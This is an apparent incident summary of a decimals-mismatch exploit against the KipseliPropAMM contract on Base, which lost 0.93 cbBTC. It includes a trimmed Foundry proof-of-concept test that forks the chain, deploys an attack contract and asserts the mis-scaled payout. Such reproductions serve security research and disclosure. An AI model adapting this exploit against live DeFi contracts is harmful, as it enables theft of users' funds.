# [?] KipseliPropAMM - Pricing / Decimals Mismatch

## Summary
Severity: Unknown
Chain: Base
Component: KipseliPropAMM
Published: 2026-04-21
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2026-04/KipseliPropAMM_exp.sol
Type: defi-exploit-poc

## Details
Lost: 0.93 cbBTC

```solidity
contract ContractTest is BaseTestWithBalanceLog {
    function setUp() public {
        uint256 forkBlock = 45_008_654;
        vm.createSelectFork("base", forkBlock);
        vm.roll(45_008_655);
        vm.warp(1_776_806_657);

        fundingToken = address(CBBTC_TOKEN);
        attacker = ATTACKER;

        vm.label(ATTACKER, "Attacker / profit receiver");
        vm.label(PROP_AMM_WRAPPER, "Kipseli PropAMMWrapper");
        vm.label(CBBTC_HOLDER, "Kipseli cbBTC holder");
        vm.label(address(WETH_TOKEN), "WETH");
        vm.label(address(CBBTC_TOKEN), "cbBTC");
    }

    function testExploit() public balanceLog {
        uint256 amountIn = 0.04 ether;
        uint256 minimumImpact = 90_000_000; // 0.9 cbBTC, using cbBTC's 8 decimals.
        uint256 attackerBefore = CBBTC_TOKEN.balanceOf(ATTACKER);
        uint256 holderBefore = CBBTC_TOKEN.balanceOf(CBBTC_HOLDER);

        KipseliAttack localAttack =
            new KipseliAttack(PROP_AMM_WRAPPER, address(WETH_TOKEN), address(CBBTC_TOKEN), ATTACKER);
        vm.label(address(localAttack), "Local attack contract");

        // step 1: fund the local attack contract through the historical profit receiver.
        deal(ATTACKER, amountIn);
        vm.prank(ATTACKER, ATTACKER);
        (uint256 quotedAmount, uint256 receivedAmount) = localAttack.run{value: amountIn}();

        // step 2: prove the quote is USDC-scale, then prove it was received as cbBTC units.
        assertGt(quotedAmount, minimumImpact, "quote was not in the exploitable scale");
        assertGt(receivedAmount, minimumImpact, "attacker did not receive cbBTC-scale output");
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2026-04/KipseliPropAMM_exp.sol_
